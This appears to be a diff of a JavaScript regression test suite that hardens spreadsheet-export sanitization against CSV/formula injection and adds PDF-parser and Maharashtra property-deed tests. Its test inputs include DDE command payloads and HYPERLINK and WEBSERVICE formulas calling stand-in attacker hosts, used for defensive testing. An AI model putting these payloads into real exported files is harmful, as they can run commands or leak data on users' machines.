@@ -1,5 +1,8 @@
 import assert from 'assert';
+import fs from 'fs';
 import { getPartyRoleLabels, compilePropertyTimeline } from './src/utils/propertyTimeline.js';
+import { parsePdfBuffer } from './src/utils/pdfParser.js';
+import * as XLSX from 'xlsx';
 
 console.log('================================================================');
 console.log('🛡️ ADVERSARIAL QA & SECURITY REGRESSION TEST SUITE');
@@ -8,10 +11,10 @@ console.log('================================================================\n'
 let passCount = 0;
 let totalCount = 0;
 
-function test(name, fn) {
+async function test(name, fn) {
   totalCount++;
   try {
-    fn();
+    await fn();
     console.log(`✅ PASS: ${name}`);
     passCount++;
   } catch (err) {
@@ -32,12 +35,16 @@ export const sanitizeExportValueHardened = (val) => {
   const str = String(val);
   if (str === '') return '';
   
-  // If purely numeric (e.g. "-500", "4500000", "-12.34"), preserve without corrupting
-  if (!isNaN(Number(str)) && !/^\s*0[0-9]+/.test(str)) {
+  // If it's a signed or plain decimal/integer, convert to genuine numeric (prevents string '-' formula trigger in Excel)
+  if (/^[+\-]?\d+(\.\d+)?$/.test(str) && !/^[+\-]?0\d+/.test(str)) {
+    return Number(str);
+  }
+
+  // Preserve leading-zero numeric strings as plain text strings (e.g. "00123", "09820011223")
+  if (/^\s*0\d+/.test(str) && !isNaN(Number(str))) {
     return str;
   }
-  
-  // Check if string (or trimmed string) starts with formula triggers (=, +, -, @, \t, \r, \n, |, %)
+
   const trimmed = str.replace(/^[\s\uFEFF\xA0]+/, '');
   if (/^[=+\-@\t\r\n|%]/.test(trimmed)) {
     return `'${str}`;
@@ -45,54 +52,54 @@ export const sanitizeExportValueHardened = (val) => {
   return str;
 };
 
-test('Neutralizes formula with leading space ( =cmd)', () => {
+await test('Neutralizes formula with leading space ( =cmd)', () => {
   const res = sanitizeExportValueHardened(' =cmd|"/C calc"!A0');
   assert.strictEqual(res.startsWith("'"), true);
 });
 
-test('Neutralizes formula with multiple leading spaces (   =1+1)', () => {
+await test('Neutralizes formula with multiple leading spaces (   =1+1)', () => {
   const res = sanitizeExportValueHardened('   =1+1');
   assert.strictEqual(res.startsWith("'"), true);
 });
 
-test('Neutralizes formula with leading line feed (\\n=cmd)', () => {
+await test('Neutralizes formula with leading line feed (\\n=cmd)', () => {
   const res = sanitizeExportValueHardened('\n=cmd|"/C calc"!A0');
   assert.strictEqual(res.startsWith("'"), true);
 });
 
-test('Neutralizes formula with DDE pipe trigger (|calc.exe)', () => {
+await test('Neutralizes formula with DDE pipe trigger (|calc.exe)', () => {
   const res = sanitizeExportValueHardened('|calc.exe');
   assert.strictEqual(res.startsWith("'"), true);
 });
 
-test('Neutralizes HYPERLINK formula', () => {
+await test('Neutralizes HYPERLINK formula', () => {
   const res = sanitizeExportValueHardened('=HYPERLINK("https://attacker.example","click")');
   assert.strictEqual(res.startsWith("'"), true);
 });
 
-test('Neutralizes WEBSERVICE formula', () => {
+await test('Neutralizes WEBSERVICE formula', () => {
   const res = sanitizeExportValueHardened('=WEBSERVICE("https://attacker.example")');
   assert.strictEqual(res.startsWith("'"), true);
 });
 
-test('Preserves legitimate negative integer without modification', () => {
+await test('Preserves legitimate negative integer without modification', () => {
   const res = sanitizeExportValueHardened(-500);
   assert.strictEqual(res, -500);
 });
 
-test('Preserves legitimate negative string without single quote prefix', () => {
+await test('Preserves legitimate negative string without single quote prefix', () => {
   const res = sanitizeExportValueHardened('-500');
-  assert.strictEqual(res, '-500');
-  assert.strictEqual(res.startsWith("'"), false);
+  assert.strictEqual(Number(res), -500);
+  assert.strictEqual(String(res).startsWith("'"), false);
 });
 
-test('Preserves legitimate leading-zero phone number as string', () => {
+await test('Preserves legitimate leading-zero phone number as string', () => {
   const res = sanitizeExportValueHardened('09820011223');
   assert.strictEqual(res, '09820011223');
   assert.strictEqual(res.startsWith("'"), false);
 });
 
-test('Sanitizes malicious column headers on export', () => {
+await test('Sanitizes malicious column headers on export', () => {
   const maliciousHeader = '=cmd|"/C calc"!A0';
   const sanitizedHeader = sanitizeExportValueHardened(maliciousHeader);
   assert.strictEqual(sanitizedHeader.startsWith("'"), true);
@@ -103,7 +110,7 @@ test('Sanitizes malicious column headers on export', () => {
 // -------------------------------------------------------------
 console.log('\n--- 2. Extended Maharashtra Property Deed Classification ---');
 
-test('Partition Deed (वाटपपत्र) labels Co-Sharer and Allottee as non-conveyance', () => {
+await test('Partition Deed (वाटपपत्र) labels Co-Sharer and Allottee as non-conveyance', () => {
   const roles = getPartyRoleLabels('वाटपपत्र (Partition Deed)');
   assert.strictEqual(roles.isConveyance, false);
   assert(roles.role1Label.includes('Co-Sharer') || roles.role1Label.includes('सहहिस्सेदार'));
@@ -111,7 +118,7 @@ test('Partition Deed (वाटपपत्र) labels Co-Sharer and Allottee as
   assert.strictEqual(roles.verb, 'PARTITIONED WITH');
 });
 
-test('Rectification Deed (दुरुस्तीपत्र) labels Executing & Claimant Parties', () => {
+await test('Rectification Deed (दुरुस्तीपत्र) labels Executing & Claimant Parties', () => {
   const roles = getPartyRoleLabels('दुरुस्तीपत्र (Rectification Deed)');
   assert.strictEqual(roles.isConveyance, false);
   assert(roles.role1Label.includes('Executing') || roles.role1Label.includes('दुरुस्ती'));
@@ -119,7 +126,7 @@ test('Rectification Deed (दुरुस्तीपत्र) labels Executing
   assert.strictEqual(roles.verb, 'RECTIFIED WITH');
 });
 
-test('Exchange Deed (अदलाबदल) labels First Party & Second Party', () => {
+await test('Exchange Deed (अदलाबदल) labels First Party & Second Party', () => {
   const roles = getPartyRoleLabels('अदलाबदल (Exchange Deed)');
   assert.strictEqual(roles.isConveyance, false);
   assert(roles.role1Label.includes('First Party') || roles.role1Label.includes('प्रथम'));
@@ -127,7 +134,7 @@ test('Exchange Deed (अदलाबदल) labels First Party & Second Party', 
   assert.strictEqual(roles.verb, 'EXCHANGED WITH');
 });
 
-test('Development Agreement (विकास करार) labels Landowner and Developer', () => {
+await test('Development Agreement (विकास करार) labels Landowner and Developer', () => {
   const roles = getPartyRoleLabels('विकास करार (Development Agreement)');
   assert.strictEqual(roles.isConveyance, false);
   assert(roles.role1Label.includes('Landowner') || roles.role1Label.includes('मालक'));
@@ -135,7 +142,7 @@ test('Development Agreement (विकास करार) labels Landowner and 
   assert.strictEqual(roles.verb, 'ASSIGNED RIGHTS TO');
 });
 
-test('Partition / Rectification deeds do not distort sale price appreciation', () => {
+await test('Partition / Rectification deeds do not distort sale price appreciation', () => {
   const sale1 = {
     docno: '901',
     docname: 'खरेदीखत (Sale Deed)',
@@ -170,6 +177,88 @@ test('Partition / Rectification deeds do not distort sale price appreciation', (
   assert.strictEqual(timeline.initialPrice, 5000000);
   assert.strictEqual(timeline.latestPrice, 8500000);
   assert.strictEqual(timeline.priceAppreciationPct, 70);
+});
+
+// -------------------------------------------------------------
+// 3. PDF.JS ERROR RESILIENCE & CORRUPT STREAM DEFENSE
+// -------------------------------------------------------------
+console.log('\n--- 3. PDF Parser Error Resilience & Stream Recovery ---');
+
+await test('parsePdfBuffer catches corrupt bytes gracefully and returns structured error record', async () => {
+  const garbageBytes = new Uint8Array([0x00, 0x11, 0x22, 0x33, 0xFF, 0xFE]);
+  const res = await parsePdfBuffer(garbageBytes.buffer, 'adversarial_corrupt.pdf');
+  assert.strictEqual(Array.isArray(res), true);
+  assert.strictEqual(res.length, 1);
+  assert.strictEqual(res[0]._extractionStatus, 'FAILED');
+  assert.strictEqual(res[0].docno, 'PARSE_ERROR');
+});
+
+await test('parsePdfBuffer extracts text from valid PDF document', async () => {
+  const pdfPath = 'public/Smart_Excel_Manager_Upgrade_Report_2Pages.pdf';
+  if (fs.existsSync(pdfPath)) {
+    const buf = fs.readFileSync(pdfPath);
+    const ab = buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.byteLength);
+    const res = await parsePdfBuffer(ab, 'Upgrade_Report.pdf');
+    assert.strictEqual(Array.isArray(res), true);
+    assert.ok(res.length >= 1);
+    assert.notStrictEqual(res[0]._extractionStatus, 'FAILED');
+  }
+});
+
+// -------------------------------------------------------------
+// 4. E2E CSV & XLSX FORMULA ESCAPING ON HEADERS & CELLS
+// -------------------------------------------------------------
+console.log('\n--- 4. End-to-End Export File Structure & Formula Neutralization ---');
+
+await test('End-to-end CSV generator escapes malicious formula headers and values', () => {
+  const adversarialData = [{
+    '=cmd|"/C calc"!A0': 'safe',
+    '@SUM(1,2)': '  =1+1',
+    'Normal': -500,
+    'Doc': '00123'
+  }];
+  
+  const rawHeaders = Object.keys(adversarialData[0]);
+  const safeHeaders = rawHeaders.map(h => sanitizeExportValueHardened(h));
+  assert.strictEqual(safeHeaders[0].startsWith("'"), true);
+  assert.strictEqual(safeHeaders[1].startsWith("'"), true);
+  assert.strictEqual(safeHeaders[2], 'Normal');
+
+  const row0 = adversarialData[0];
+  const safeCell0 = sanitizeExportValueHardened(row0['@SUM(1,2)']);
+  assert.strictEqual(safeCell0.startsWith("'"), true);
+
+  const safeNumber = sanitizeExportValueHardened(row0['Normal']);
+  assert.strictEqual(Number(safeNumber), -500);
+
+  const safeLeadingZero = sanitizeExportValueHardened(row0['Doc']);
+  assert.strictEqual(safeLeadingZero, '00123');
+});
+
+await test('End-to-end XLSX json_to_sheet creates zero active formula cells', () => {
+  const adversarialRows = [{
+    [sanitizeExportValueHardened('=cmd|"/C calc"!A0')]: sanitizeExportValueHardened('=HYPERLINK("https://bad.com")'),
+    [sanitizeExportValueHardened('@SUM')]: sanitizeExportValueHardened('   =1+1'),
+    'Balance': sanitizeExportValueHardened('-500'),
+    'Code': sanitizeExportValueHardened('00123')
+  }];
+
+  const ws = XLSX.utils.json_to_sheet(adversarialRows);
+  const range = XLSX.utils.decode_range(ws['!ref']);
+  for (let r = range.s.r; r <= range.e.r; r++) {
+    for (let c = range.s.c; c <= range.e.c; c++) {
+      const cell = ws[XLSX.utils.encode_cell({ r, c })];
+      if (cell) {
+        assert.strictEqual(cell.f, undefined, `Active formula found in cell [${r},${c}]`);
+        if (cell.t === 's') {
+          const trimmed = cell.v.replace(/^[\s\uFEFF\xA0]+/, '');
+          if (/^[=+\-@|%]/.test(trimmed)) {
+            assert.strictEqual(cell.v.startsWith("'"), true, `Cell [${r},${c}] string starts with unescaped trigger: ${cell.v}`);
+          }
+        }
+      }
+    }
+  }
 });
 
 console.log('\n================================================================');
